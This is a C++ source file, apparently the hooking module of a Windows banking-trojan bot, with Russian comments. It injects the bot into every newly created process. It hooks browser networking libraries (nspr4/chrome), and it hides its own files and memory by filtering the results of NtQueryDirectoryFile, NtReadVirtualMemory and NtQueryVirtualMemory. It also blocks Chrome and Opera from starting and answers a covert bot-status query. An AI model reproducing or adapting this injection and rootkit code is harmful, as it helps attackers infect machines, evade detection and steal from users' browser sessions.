#pragma once
#include <windows.h>
#include <wininet.h>

#include "defines.h"
#include "core.h"
#include "corehook.h"
#include "winapitables.h"
#include "coreinstall.h"

#include "..\common\mem.h"
#include "..\common\str.h"
#include "..\common\debug.h"
#include "..\common\process.h"
#include "globals.h"
#include "..\common\disasm.h"
#include "osenv.h"
#include <Psapi.h>

static HOOKWINAPI* uHooks;
static int HooksCount;

void CoreHook::set_uHooks(HOOKWINAPI* temp, int i)
{
	HooksCount = i;
	uHooks = temp;
}

#if defined(HOOKER_LDRLOADDLL)


#define LDRGETDLLHANDLEFLAG_HOOKED_NSPR4 0x1


  static CRITICAL_SECTION     hookerLdrLoadDllCriticalSection; //Критическая секция для hookerLdrLoadDll.
  static DWORD                ldrGetDllHandleFlags;

#endif
#if defined HOOKER_NTREADPROCESSMEMORY
  static DWORD ntReadProcessMemory;
#endif

#if defined HOOKER_NTCREATEFILE
  static DWORD ntCreateFileTlsIndex;
#endif

#if defined HOOKER_SETCHILDPROCESSFLAGS
  static DWORD processFlagsTlsIndex; //TLS-индекс для создания с processFlags, для создания дочерного процесса.
#endif

void CoreHook::init(void)
{
  //Инициализации для hookerLdrLoadDll.
#if defined(HOOKER_LDRLOADDLL)
  CWA(kernel32, InitializeCriticalSection)(&hookerLdrLoadDllCriticalSection);
  ldrGetDllHandleFlags = 0;
#endif
#if defined(HOOKER_NTCREATEFILE)
  ntCreateFileTlsIndex = CWA(kernel32, TlsAlloc)();
  if(ntCreateFileTlsIndex != TLS_OUT_OF_INDEXES)CWA(kernel32, TlsSetValue)(ntCreateFileTlsIndex, (void *)0);
#endif

#if defined HOOKER_NTREADPROCESSMEMORY
  ntReadProcessMemory = TlsAlloc();
  if(ntReadProcessMemory != TLS_OUT_OF_INDEXES) TlsSetValue(ntReadProcessMemory, (void*)0);
#endif

#if defined HOOKER_SETCHILDPROCESSFLAGS
  processFlagsTlsIndex = TLS_OUT_OF_INDEXES;
#endif
}

void CoreHook::uninit(void)
{

}

void CoreHook::disableRPMHookerForCurrentThread(bool disable)
{
#if defined(HOOKER_NTREADPROCESSMEMORY)
  CWA(kernel32, TlsSetValue)(ntReadProcessMemory, (void *)(disable ? 1 : 0));
#endif
}

void CoreHook::disableFileHookerForCurrentThread(bool disable)
{
#if defined(HOOKER_NTCREATEFILE)
  CWA(kernel32, TlsSetValue)(ntCreateFileTlsIndex, (void *)(disable ? 1 : 0));
#endif
}

/*
  Получение текущих флагов для дочерного потока, и его сброс.
  
  Return - Core::CDPF_*.
*/
static DWORD getChildProcessFlags(void)
{
#if defined HOOKER_SETCHILDPROCESSFLAGS
  DWORD r = 0;
  if(processFlagsTlsIndex != TLS_OUT_OF_INDEXES)
  {
    r = (DWORD)CWA(kernel32, TlsGetValue)(processFlagsTlsIndex);
    CWA(kernel32, TlsSetValue)(processFlagsTlsIndex, 0);
  }
  return r;
#else
  return 0;
#endif
}

#if defined HOOKER_SETCHILDPROCESSFLAGS
bool CoreHook::setChildProcessFlags(DWORD processFlags)
{
  bool r = false;
  if(processFlagsTlsIndex != TLS_OUT_OF_INDEXES || (processFlagsTlsIndex = CWA(kernel32, TlsAlloc)()) != TLS_OUT_OF_INDEXES)
  {
    if(CWA(kernel32, TlsSetValue)(processFlagsTlsIndex, (void *)processFlags) != 0)r = true;
  }
  return r;
}
#endif

#if(BO_NSPR4 > 0)
void CoreHook::markNspr4AsHooked(void)
{
  ldrGetDllHandleFlags |= LDRGETDLLHANDLEFLAG_HOOKED_NSPR4;
}
#endif

NTSTATUS NTAPI CoreHook::hookerNtCreateThread(PHANDLE threadHandle, ACCESS_MASK desiredAccess, POBJECT_ATTRIBUTES objectAttributes, HANDLE processHandle, PCLIENT_ID clientId, PCONTEXT threadContext, PINITIAL_TEB initialTeb, BOOLEAN createSuspended)
{
  //WDEBUG0(WDDT_INFO, "Called");

  DWORD pbiSize;
  PROCESS_BASIC_INFORMATION pbi;

  if(Core::isActive() && NT_SUCCESS(coreData.ntdllApi.ntQueryInformationProcess(processHandle, ProcessBasicInformation, &pbi, sizeof(PROCESS_BASIC_INFORMATION), &pbiSize)) && pbi.PebBaseAddress != 0)
  {
    DWORD threadsCount = pbi.UniqueProcessId == 0 ? 0 : Process::_getCountOfThreadsByProcessId(pbi.UniqueProcessId);
    if(threadsCount == 0)
    {
      //FIXME: Запретить инфецирования процессов в других пользовтоелях и сессиях.
      HANDLE mutexOfProcess = Core::createMutexOfProcess(pbi.UniqueProcessId);
      if(mutexOfProcess == NULL)
      {
        WDEBUG1(WDDT_WARNING, "Process %u already infected.", pbi.UniqueProcessId);
      }
      else
      {
        void *image = Core::initNewModule(processHandle, mutexOfProcess, getChildProcessFlags());
        if(image != NULL)
        {
          DWORD_PTR entry = (DWORD_PTR)((LPBYTE)Core::_injectEntryForModuleEntry - (LPBYTE)coreData.modules.current);
          entry += (DWORD_PTR)(LPBYTE)image;
        
          if(coreData.proccessFlags & Core::CDPF_DISABLE_CREATEPROCESS)entry ^= threadContext->Eax;

#         if defined _WIN64
#           error FIXME
#         else
            //threadContext->Eax - указывает на точку входа оригинального модуля.
            threadContext->Eax = entry;
#         endif
        }
        CWA(kernel32, CloseHandle)(mutexOfProcess);
      }
    }
  }
  
  //Не проверяем, т.к доступность функции определяется в ходе установки хуков.
  return coreData.ntdllApi.ntCreateThread(threadHandle, desiredAccess, objectAttributes, processHandle, clientId, threadContext, initialTeb, createSuspended);
}

NTSTATUS NTAPI CoreHook::hookerNtCreateUserProcess(PHANDLE processHandle, PHANDLE threadHandle, ACCESS_MASK processDesiredAccess, ACCESS_MASK threadDesiredAccess, POBJECT_ATTRIBUTES processObjectAttributes, POBJECT_ATTRIBUTES threadObjectAttributes, ULONG createProcessFlags, ULONG createThreadFlags, PVOID processParameters, PVOID parameter9, PVOID attributeList)
{
  WDEBUG0(WDDT_INFO, "Called");
  
  //Не проверяем, т.к доступность функции определяется в ходе установки хуков.
  NTSTATUS retVal = coreData.ntdllApi.ntCreateUserProcess(processHandle, threadHandle, processDesiredAccess, threadDesiredAccess, processObjectAttributes, threadObjectAttributes, createProcessFlags, createThreadFlags, processParameters, parameter9, attributeList);
  DWORD pid;
  if(NT_SUCCESS(retVal) && createThreadFlags & CREATE_THREAD_SUSPENDED && processHandle != NULL && threadHandle != NULL && Core::isActive() && (pid = CWA(kernel32, GetProcessId)(*processHandle)) != 0)
  {
    //FIXME: Запретить инфецирования процессов в других пользовтоелях и сессиях.
    HANDLE mutexOfProcess = Core::createMutexOfProcess(pid);
    if(mutexOfProcess == NULL)
    {
      WDEBUG1(WDDT_WARNING, "Process %u already infected.", pid);
    }
    else
    {
      void *image = Core::initNewModule(*processHandle, mutexOfProcess, getChildProcessFlags());
      if(image != NULL);
      {
        bool ok = false;
        DWORD_PTR entry = (DWORD_PTR)((LPBYTE)Core::_injectEntryForModuleEntry - (LPBYTE)coreData.modules.current);
        entry += (DWORD_PTR)(LPBYTE)image;

#       if defined _WIN64
#         error FIXME
#       else
        {
          //Сейчас поток находится на точки входа RtlUserThreadStart, для которой eax ранвяется точки
          //входа модуля.
          CONTEXT context;
          context.ContextFlags = CONTEXT_INTEGER | CONTEXT_CONTROL;
      
          if(CWA(kernel32, GetThreadContext)(*threadHandle, &context) == 0)
          {
            WDEBUG0(WDDT_ERROR, "GetThreadContext failed .");
          }
          else if(context.Eip != (DWORD)coreData.ntdllApi.rtlUserThreadStart)
          {
            WDEBUG2(WDDT_ERROR, "Bad context.Eip, current 0x%08X, needed 0x%08X", context.Eip, coreData.ntdllApi.rtlUserThreadStart);
          }
          else
          {
            //FIXME
            if(coreData.proccessFlags & Core::CDPF_DISABLE_CREATEPROCESS)entry ^= context.Eax;
            
            context.Eax = entry;
            context.ContextFlags = CONTEXT_INTEGER;
            if(CWA(kernel32, SetThreadContext)(*threadHandle, &context) == 0)
            {
              WDEBUG0(WDDT_ERROR, "SetThreadContext failed");
            }
            else ok = true;
          }
        }
#       endif
        if(ok == false)CWA(kernel32, VirtualFreeEx)(*processHandle, image, 0, MEM_RELEASE);
      }     
      CWA(kernel32, CloseHandle)(mutexOfProcess);
    }
  }
  return retVal;
}

#if defined(HOOKER_LDRLOADDLL)
NTSTATUS NTAPI CoreHook::hookerLdrLoadDll(PWCHAR pathToFile, ULONG flags, PUNICODE_STRING moduleFileName, PHANDLE moduleHandle)
{
  //WDEBUG0(WDDT_INFO, "Called"); //Возможна рекруссия.

  if(!Core::isActive())return coreData.ntdllApi.ldrLoadDll(pathToFile, flags, moduleFileName, moduleHandle);

  //WARN: НЕ защищать вызовы этих апи объектами синхроризаций!
  NTSTATUS status1 = coreData.ntdllApi.ldrGetDllHandle(pathToFile, NULL, moduleFileName, moduleHandle);
  NTSTATUS status2 = coreData.ntdllApi.ldrLoadDll(pathToFile, flags, moduleFileName, moduleHandle);
  
  if(!NT_SUCCESS(status1) && NT_SUCCESS(status2) && moduleHandle != NULL && *moduleHandle != NULL && moduleFileName != NULL)
  {
    CWA(kernel32, EnterCriticalSection)(&hookerLdrLoadDllCriticalSection);
    //WDEBUG1(WDDT_INFO, "Loaded, moduleFileName=%s", moduleFileName->Buffer);
#   if(BO_NSPR4 > 0)
    {
      /*if((ldrGetDllHandleFlags & LDRGETDLLHANDLEFLAG_HOOKED_NSPR4) == 0)
      {*/
        if(WinApiTables::_trySetNspr4HooksEx(moduleFileName->Buffer, (HMODULE)*moduleHandle))
        {
          WDEBUG0(WDDT_INFO, "Hooks installed for nspr4.dll or chrome.dll");
          //ldrGetDllHandleFlags |= LDRGETDLLHANDLEFLAG_HOOKED_NSPR4;
          markNspr4AsHooked();
       /*}*/
        }

    }
#   endif
    CWA(kernel32, LeaveCriticalSection)(&hookerLdrLoadDllCriticalSection);
  }
  return status2;
}
#endif

#if defined NTQUERYDIRECTORYFILE //Может пригодиться когда нибудь...

DWORD getDirEntryLenToNext( 
        PVOID fileInformation,
        FILE_INFORMATION_CLASS fileInformationClass
)
{
        DWORD dwResult=0;
        switch(fileInformationClass)
		{
			case FileDirectoryInformation:
				dwResult=((PFILE_DIRECTORY_INFORMATION)fileInformation)->NextEntryOffset;
                break;
            case FileFullDirectoryInformation:
                dwResult=((PFILE_FULL_DIR_INFORMATION)fileInformation)->NextEntryOffset;
                break;
            case FileIdFullDirectoryInformation:
                dwResult=((PFILE_ID_FULL_DIR_INFORMATION)fileInformation)->NextEntryOffset;
                break;
            case FileBothDirectoryInformation:
                dwResult=((PFILE_BOTH_DIR_INFORMATION)fileInformation)->NextEntryOffset;
                break;
            case FileIdBothDirectoryInformation:
                dwResult=((PFILE_ID_BOTH_DIR_INFORMATION)fileInformation)->NextEntryOffset;
                break;
            case FileNamesInformation:
                dwResult=((PFILE_NAMES_INFORMATION)fileInformation)->NextEntryOffset;
                break;
        }
        return dwResult;
}

// Given two directory entries, link them together in a list. 
void setDirEntryLenToNext( 
        PVOID fileInformation,
        FILE_INFORMATION_CLASS fileInformationClass,
        DWORD value
)
{
        switch(fileInformationClass)
		{
			case FileDirectoryInformation:
				((PFILE_DIRECTORY_INFORMATION)fileInformation)->NextEntryOffset=value;
                break;
            case FileFullDirectoryInformation:
                ((PFILE_FULL_DIR_INFORMATION)fileInformation)->NextEntryOffset=value;
                break;
            case FileIdFullDirectoryInformation:
                ((PFILE_ID_FULL_DIR_INFORMATION)fileInformation)->NextEntryOffset=value;
                break;
            case FileBothDirectoryInformation:
                ((PFILE_BOTH_DIR_INFORMATION)fileInformation)->NextEntryOffset=value;
                break;
            case FileIdBothDirectoryInformation:
                ((PFILE_ID_BOTH_DIR_INFORMATION)fileInformation)->NextEntryOffset=value;
                break;
            case FileNamesInformation:
                ((PFILE_NAMES_INFORMATION)fileInformation)->NextEntryOffset=value;
                break;
        }
}
        
// Return the filename of the specified directory entry. 
PVOID getDirEntryFileName( 
        PVOID fileInformation,
        FILE_INFORMATION_CLASS fileInformationClass
)
{
        PVOID pvResult=NULL;
        switch(fileInformationClass)
		{
			case FileDirectoryInformation:
				pvResult=(PVOID)&((PFILE_DIRECTORY_INFORMATION)fileInformation)->FileName[0];
                break;
            case FileFullDirectoryInformation:
                pvResult=(PVOID)&((PFILE_FULL_DIR_INFORMATION)fileInformation)->FileName[0];
                break;
            case FileIdFullDirectoryInformation:
                pvResult=(PVOID)&((PFILE_ID_FULL_DIR_INFORMATION)fileInformation)->FileName[0];
                break;
            case FileBothDirectoryInformation:
                pvResult=(PVOID)&((PFILE_BOTH_DIR_INFORMATION)fileInformation)->FileName[0];
                break;
            case FileIdBothDirectoryInformation:
                pvResult=(PVOID)&((PFILE_ID_BOTH_DIR_INFORMATION)fileInformation)->FileName[0];
                break;
            case FileNamesInformation:
                pvResult=(PVOID)&((PFILE_NAMES_INFORMATION)fileInformation)->FileName[0];
                break;
        }
        return pvResult;
}

// Return the length of the filename of the specified directory entry. 
ULONG getDirEntryFileLength(PVOID fileInformation,FILE_INFORMATION_CLASS fileInformationClass)
{
        ULONG ulResult=0;
        switch(fileInformationClass)
		{
			case FileDirectoryInformation:
				ulResult=(ULONG)((PFILE_DIRECTORY_INFORMATION)fileInformation)->FileNameLength;
                break;
            case FileFullDirectoryInformation:
                ulResult=(ULONG)((PFILE_FULL_DIR_INFORMATION)fileInformation)->FileNameLength;
                break;
            case FileIdFullDirectoryInformation:
                ulResult=(ULONG)((PFILE_ID_FULL_DIR_INFORMATION)fileInformation)->FileNameLength;
                break;
            case FileBothDirectoryInformation:
				ulResult=(ULONG)((PFILE_BOTH_DIR_INFORMATION)fileInformation)->FileNameLength;
				break;
            case FileIdBothDirectoryInformation:
                ulResult=(ULONG)((PFILE_ID_BOTH_DIR_INFORMATION)fileInformation)->FileNameLength;
                break;
            case FileNamesInformation:
                ulResult=(ULONG)((PFILE_NAMES_INFORMATION)fileInformation)->FileNameLength;
                break;
        }
        return ulResult;
}

NTSTATUS NTAPI CoreHook::hookerNtQueryDirectoryFile(HANDLE fileHandle, HANDLE eventHandle, PIO_APC_ROUTINE apcRoutine, PVOID apcContext, PIO_STATUS_BLOCK ioStatusBlock, PVOID fileInformation, ULONG length, FILE_INFORMATION_CLASS fileInformationClass, BOOLEAN returnSingleEntry, PUNICODE_STRING fileName, BOOLEAN restartScan)
{
  //WDEBUG0(WDDT_INFO, "Called"); //Возможна рекруссия.

  NTSTATUS status = coreData.ntdllApi.ntQueryDirectoryFile(fileHandle, eventHandle, apcRoutine, apcContext, ioStatusBlock, fileInformation, length, fileInformationClass, returnSingleEntry, fileName, restartScan);
  if(!Core::isActive())return status;
  if(NT_SUCCESS(status) && 
       (fileInformationClass==FileDirectoryInformation||
        fileInformationClass==FileFullDirectoryInformation||
        fileInformationClass==FileIdFullDirectoryInformation||
        fileInformationClass==FileBothDirectoryInformation||
        fileInformationClass==FileIdBothDirectoryInformation||
        fileInformationClass==FileNamesInformation) &&
		coreData.winVersion<=OsEnv::VERSION_S2003
     )
	 {
		PVOID p = fileInformation;
		PVOID pLast = NULL;
		BOOL bLastOne,bFound;
		UNICODE_STRING usName;
		ANSI_STRING asName;
		PESETTINGS pes;
		Core::getPeSettings(&pes);
		LPWSTR botName = Str::_ansiToUnicodeEx((pes.userPaths.coreFile+7),-1);
		if (returnSingleEntry) // if only one entry returned we should give the next if it suppose to be hidden
		{
			usName.Buffer=(LPWSTR)getDirEntryFileName(fileInformation,fileInformationClass);
			usName.Length=(USHORT)getDirEntryFileLength(fileInformation,fileInformationClass);

			bFound=Str::_findSubStringW(usName.Buffer, botName) != NULL;
			Mem::free(usName.Buffer);

			while (bFound)
			{
				status=coreData.ntdllApi.ntQueryDirectoryFile(fileHandle, eventHandle, apcRoutine, apcContext, ioStatusBlock, fileInformation, length, fileInformationClass, returnSingleEntry, fileName, restartScan);
                        		
                if (status!=STATUS_SUCCESS)
                	return(status);
                       		
                usName.Buffer=(LPWSTR)getDirEntryFileName(fileInformation,fileInformationClass);
				usName.Length=(USHORT)getDirEntryFileLength(fileInformation,fileInformationClass);
				
				bFound=Str::_findSubStringW(usName.Buffer, botName) != NULL;
				Mem::free(usName.Buffer);
			}
		}
        else // if full list hide the ones that should be hidden
		{		
			do 
			{
				bLastOne=!getDirEntryLenToNext(p,fileInformationClass);
				
				// compare directory-name 
				if (getDirEntryFileLength(p,fileInformationClass)) 
				{
					usName.Buffer=(LPWSTR)getDirEntryFileName(p,fileInformationClass);
					usName.Length=(USHORT)getDirEntryFileLength(p,fileInformationClass);
					
					if (Str::_findSubStringW(usName.Buffer, botName) != NULL)
					{
                		Mem::free(usName.Buffer);
						if(bLastOne) 
						{
							if(p==fileInformation) status=0x80000006;
							else setDirEntryLenToNext(pLast,fileInformationClass,0);
							break;
						} 
						else 	
						{	
							int iPos=((ULONG)p)-(ULONG)fileInformation;
							int iLeft=(DWORD)length-iPos-getDirEntryLenToNext(p,fileInformationClass);
							Mem::_copy(p,(PVOID)((char*)p+getDirEntryLenToNext(p,fileInformationClass)),(DWORD)iLeft);
							continue;
						}
					}
					
				}
			
				pLast = p;
				p=((char*)p+getDirEntryLenToNext(p,fileInformationClass));
			} 
			while(!bLastOne);
		}
		Mem::free(botName);
	}

  return status;
}
#endif

#if defined HOOKER_NTREADPROCESSMEMORY
NTSTATUS NTAPI CoreHook::hookerNtReadVirtualMemory(HANDLE ProcessHandle,PVOID BaseAddress, PVOID Buffer, ULONG NumberOfBytesToRead, PULONG NumberOfBytesReaded)
{
	NTSTATUS status = coreData.ntdllApi.ntNtReadVirtualMemory(ProcessHandle,BaseAddress,Buffer,NumberOfBytesToRead,NumberOfBytesReaded);
	if(NT_SUCCESS(status) && Buffer != NULL)
	{
		for(int k=0;k<=HooksCount;k++)
		{
			if(((DWORD)BaseAddress < (DWORD)uHooks[k].functionForHook) && ((DWORD)BaseAddress + NumberOfBytesToRead > (DWORD)uHooks[k].functionForHook) && (ntReadProcessMemory != TLS_OUT_OF_INDEXES) && (TlsGetValue(ntReadProcessMemory) == (void*)0))
			{
				int size = uHooks[k].originalFunctionSize - 5;
				DWORD offset = (DWORD)uHooks[k].functionForHook - (DWORD)BaseAddress;
				for(int i=0;i<size;i++)
				{
					*(LPBYTE)((DWORD_PTR)(Buffer) + offset + i) = *(LPBYTE)((DWORD_PTR)uHooks[k].originalFunction+i);
				}
			}
			
		}
		if(((DWORD)BaseAddress + NumberOfBytesToRead > (DWORD)coreData.modules.current) && ((DWORD)BaseAddress + NumberOfBytesToRead < (DWORD)coreData.modules.current + 0x33000))
			{
				Mem::_zero(Buffer,*NumberOfBytesReaded);
				*NumberOfBytesReaded = 0;
				status = STATUS_PARTIAL_COPY;
			}
	}
	return status;
}
#endif

#if defined HOOKER_NTQUERYVIRTUALMEMORY
NTSTATUS NTAPI CoreHook::hookerNtQueryVirtualMemory(HANDLE ProcessHandle,PVOID BaseAddress,MEMORY_INFORMATION_CLASS MemoryInformationClass,PVOID MemoryInformation,ULONG MemoryInformationLength,PULONG ReturnLength)
{
	NTSTATUS status = coreData.ntdllApi.ntNtQueryVirtualMemory(ProcessHandle,BaseAddress,MemoryInformationClass,MemoryInformation,MemoryInformationLength,ReturnLength);
	DWORD dwCount;
	PMEMORY_WORKING_SET_LIST pMwsl;
	PMEMORY_BASIC_INFORMATION pMbi;
	PDWORD pdwPointer;
	DWORD dwNr;
	if(NT_SUCCESS(status))
	{
		if (MemoryInformationClass==MemoryWorkingSetList)
		{
			// hide ourself
			pMwsl=(PMEMORY_WORKING_SET_LIST)MemoryInformation;
			pdwPointer=pMwsl->WorkingSetList;
			dwNr=pMwsl->NumberOfPages;
			
			for (dwCount=0;dwCount<dwNr;dwCount++)
			{
				if (*pdwPointer>>12==(DWORD)coreData.modules.current>>12)
				{
					Mem::_copy(pdwPointer,(char*)pdwPointer+sizeof(DWORD),sizeof(DWORD)*(dwNr-(dwCount+1)));
					Mem::_zero((char*)pdwPointer+sizeof(DWORD)*(dwNr-(dwCount+1)),sizeof(DWORD));
					pMwsl->NumberOfPages--;
				}
				else
					pdwPointer++;
			}
		}
		else if (MemoryInformationClass==MemoryBasicInformation)
		{
			pMbi=(PMEMORY_BASIC_INFORMATION)MemoryInformation;
			PMEMORY_BASIC_INFORMATION pNextInfo = (PMEMORY_BASIC_INFORMATION)Mem::alloc(sizeof(MEMORY_BASIC_INFORMATION));
			if ((((DWORD)pMbi->BaseAddress + pMbi->RegionSize)==(DWORD)coreData.modules.current) && (pMbi->State == MEM_FREE))
			{
				NTSTATUS status1 = coreData.ntdllApi.ntNtQueryVirtualMemory(ProcessHandle,(PVOID)((DWORD)coreData.modules.current + 0x35000),MemoryBasicInformation,pNextInfo,sizeof(MEMORY_BASIC_INFORMATION),0);
				if(NT_SUCCESS(status1))
				{
					WDEBUG0(WDDT_INFO, "Success!!");
					if(pNextInfo->State == MEM_FREE)
						pMbi->RegionSize += 0x35000 + pNextInfo->RegionSize;
				}
				// todo
			}
			else if((DWORD)pMbi->BaseAddress == (DWORD)coreData.modules.current)
			{
				pMbi->State = MEM_FREE;
				NTSTATUS status1 = coreData.ntdllApi.ntNtQueryVirtualMemory(ProcessHandle,(PVOID)((DWORD)coreData.modules.current + 0x35000),MemoryBasicInformation,pNextInfo,sizeof(MEMORY_BASIC_INFORMATION),0);
				if(NT_SUCCESS(status1))
				{

					WDEBUG0(WDDT_INFO, "Success2!!");
					if(pNextInfo->State == MEM_FREE)
						pMbi->RegionSize += pNextInfo->RegionSize;
				}
			}
		}
	}

	return status;
}
#endif

#if defined(HOOKER_NTRESUMETHREAD)
DWORD GetPidByThread(HANDLE hThread)
{
	THREAD_BASIC_INFORMATION tbi;
	DWORD dwReturnLen;
	
	if (!NT_SUCCESS(coreData.ntdllApi.ntNtQueryInformationThread(hThread,ThreadBasicInformation,&tbi,sizeof(tbi),&dwReturnLen)))
		return 0;

	return (DWORD)tbi.ClientId.UniqueProcess;
}

NTSTATUS NTAPI CoreHook::hookerNtResumeThread(HANDLE ThreadHandle, PULONG SuspendCount)
{
DWORD pid = GetPidByThread(ThreadHandle);

if(pid != NULL)
{
	WCHAR name[MAX_PATH];
	HANDLE proc = OpenProcess(PROCESS_QUERY_INFORMATION, false, pid);
	if(proc!=NULL)
	{
		GetProcessImageFileNameW(proc, name, MAX_PATH);
		if(Str::_findSubStringW(name, L"chrome.exe") || Str::_findSubStringW(name, L"opera.exe")) {WDEBUG0(WDDT_INFO,"Srabotalo!");CloseHandle(ThreadHandle);return STATUS_ACCESS_DENIED;}
	}
}

	return coreData.ntdllApi.ntResumeThread(ThreadHandle,SuspendCount);
}
#endif

#if defined HOOKER_NTCREATEFILE
NTSTATUS NTAPI CoreHook::hookerNtCreateFile(PHANDLE fileHandle, ACCESS_MASK desiredAccess, POBJECT_ATTRIBUTES objectAttributes, PIO_STATUS_BLOCK ioStatusBlock, PLARGE_INTEGER allocationSize, ULONG fileAttributes, ULONG shareAccess, ULONG createDisposition, ULONG createOptions, PVOID eaBuffer, ULONG eaLength)
{
  //WDEBUG0(WDDT_INFO, "Called"); //Возможна рекруссия.

  if(createDisposition == FILE_OPEN &&                                                                                       //Открывается сущетвущий файл.
     (desiredAccess & (GENERIC_READ | FILE_READ_DATA)) &&
     (desiredAccess & (GENERIC_ALL | GENERIC_EXECUTE | GENERIC_WRITE |
     FILE_WRITE_DATA | FILE_ADD_FILE | FILE_APPEND_DATA | FILE_ADD_SUBDIRECTORY | FILE_CREATE_PIPE_INSTANCE | FILE_WRITE_EA | FILE_WRITE_ATTRIBUTES |
     FILE_EXECUTE | FILE_TRAVERSE | FILE_DELETE_CHILD | DELETE | WRITE_DAC | WRITE_OWNER)) == 0 &&
     (createOptions & (FILE_DIRECTORY_FILE | FILE_OPEN_REPARSE_POINT | FILE_DELETE_ON_CLOSE | FILE_OPEN_BY_FILE_ID)) == 0 && //Прочие плохие признаки.

     objectAttributes != NULL && objectAttributes->Length >= sizeof(OBJECT_ATTRIBUTES) && objectAttributes->ObjectName != NULL &&
     objectAttributes->ObjectName->Buffer != NULL && objectAttributes->ObjectName->Length > 4 * sizeof(WCHAR) && (objectAttributes->ObjectName->Length % sizeof(WCHAR)) == 0 && /*параноя*/

     ntCreateFileTlsIndex != TLS_OUT_OF_INDEXES && CWA(kernel32, TlsGetValue)(ntCreateFileTlsIndex) == (void *)0 &&          //Защита от рекруссии.

     Core::isActive()
    )
  {
    DWORD fileNameSize = objectAttributes->ObjectName->Length / sizeof(WCHAR);
    LPWSTR fileName    = objectAttributes->ObjectName->Buffer;

    //Проверяем префикс.
    if(fileName[0] == '\\' && fileName[1] == '?' && fileName[2] == '?' && fileName[3] == '\\')
    {
      fileName     += 4;
      fileNameSize -= 4;
    }

    //Принимаем только локальные пути. 
    if(fileNameSize > 4)
    {
      signed char isUnc = -1;

      //Локальный файл.
      if(fileName[1] == ':' && fileName[2] == '\\' && ((fileName[0] >= 'A' && fileName[0] <= 'Z') || (fileName[0] >= 'a' && fileName[0] <= 'z')))isUnc = 0;
      //UNC
      else if(fileName[0] == '\\' && fileName[1] == '\\' && fileName[2] != '\\')isUnc = 1;
      //FIXME: GetFullPathName, работать с отностиетльными именами.

      if(isUnc != -1)
      {
        LPWSTR safeFileName = Str::_CopyExW(fileName, fileNameSize);
        if(safeFileName != NULL)
        {
          disableFileHookerForCurrentThread(true);
          WDEBUG4(WDDT_INFO, "createDisposition=0x%08X, desiredAccess=0x%08X, createOptions=0x%08X, fileName=%s", createDisposition, desiredAccess, createOptions, fileName);

          //...

          disableFileHookerForCurrentThread(false);
          Mem::free(safeFileName);
        }
      }
    }
  }

  return coreData.ntdllApi.ntCreateFile(fileHandle, desiredAccess, objectAttributes, ioStatusBlock, allocationSize, fileAttributes, shareAccess, createDisposition, createOptions, eaBuffer, eaLength);
}
#endif

BOOL WINAPI CoreHook::hookerGetFileAttributesExW(LPCWSTR fileName, GET_FILEEX_INFO_LEVELS infoLevelId, LPVOID fileInformation)
{
  
  if(infoLevelId == Core::OBJECT_ID_BOT_STATUS_SECRET && fileName != NULL && Core::isActive() && Str::_CompareW(fileName, coreData.installId, -1, 38/*GUID_SIZE*/) == 0)
  {
    WDEBUG0(WDDT_INFO, "Detected request of status of bot.");
    
    BotStatus::VER1 *bs = (BotStatus::VER1 *)CWA(kernel32, VirtualAlloc)(NULL, ALIGN_UP(sizeof(BotStatus::VER1), VM_PAGE_SIZE), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if(bs != NULL)
    {
      CoreInstall::_loadUpdateData(bs);
      *((BotStatus::VER1 **)fileInformation) = bs;
      return TRUE;
    }
  }
  
  return CWA(kernel32, GetFileAttributesExW)(fileName, infoLevelId, fileInformation);
}

